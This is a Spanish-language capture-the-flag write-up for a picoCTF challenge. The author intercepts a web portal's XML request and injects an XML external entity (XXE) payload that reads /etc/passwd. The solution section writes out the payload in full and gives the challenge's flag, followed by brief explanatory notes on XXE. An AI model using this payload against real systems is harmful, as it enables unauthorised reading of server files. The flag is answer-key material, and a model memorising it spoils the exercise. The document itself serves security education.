
## Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:56262/)

## Solución

Desde la descripción del reto se nos dice que debemos acceder al archivo /etc/passwd. 
La pista menciona inyección de entidad externa XML. 
Probé varias cosas y nada, así que ingresé a inspeccionar el código y revisé algunos archivos.
Investigué al respecto y probé a interceptar la petición. 
En inspeccionar, network di click a un botón dentró del sitio  y di con la petición XML base cuando aparecía un metodo POST.
`<?xml version="1.0" encoding="UTF-8"?>`
Aquí me di cuenta de que en esta parte radicaba el ataque, aquí hay que hacer la inyección para lograr leer el archivo.
Complemento con lo siguiente:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
Reenvío y veo que aparece otro método post, lo selecciono y en el apartado de response puedo ver el contenido del archivo.
Al final de él tenemos la bandera.
`picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}`

## Notas adicionales

- Una inyección de entidad eXternal de XML (XXE) es un ataque contra aplicaciones que analizan entradas XML.
- Un ataque XXE se produce cuando un analizador XML configurado de forma débil procesa una entrada XML no confiable con una referencia a una entidad externa.

## Referencias

[Inyecciones de entidades externas XML (XXE)  |  Security  |  Android Developers](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=es-419)